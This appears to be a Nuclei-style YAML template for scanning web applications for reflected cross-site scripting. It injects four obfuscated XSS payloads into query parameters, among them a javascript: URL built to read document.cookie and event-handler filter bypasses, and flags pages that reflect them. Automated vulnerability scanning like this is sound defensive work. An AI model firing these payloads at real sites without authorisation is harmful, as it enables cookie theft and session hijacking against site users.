http:
- fuzzing:
  - fuzz:
    - '{{reflection}}'
    mode: single
    part: query
    type: replace
  matchers:
  - part: body
    type: word
    words:
    - '{{reflection}}'
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  payloads:
    reflection:
    - <iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>
    - /path?next=javascript:top[/al/.source+/ert/.source](document.cookie)
    - login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
    - <details%0Aopen%0AonToGgle%0A=%0Aabc=(confirm);abc(VulneravelXSS%26%2300000000000000000041//
  pre-condition:
  - dsl:
    - method == "GET"
    type: dsl
  stop-at-first-match: true
id: reflected-xss4
info:
  author: github.com/freelancermijan
  name: Reflected Cross Site Scripting
  severity: medium
  tags: xss,rxss,dast
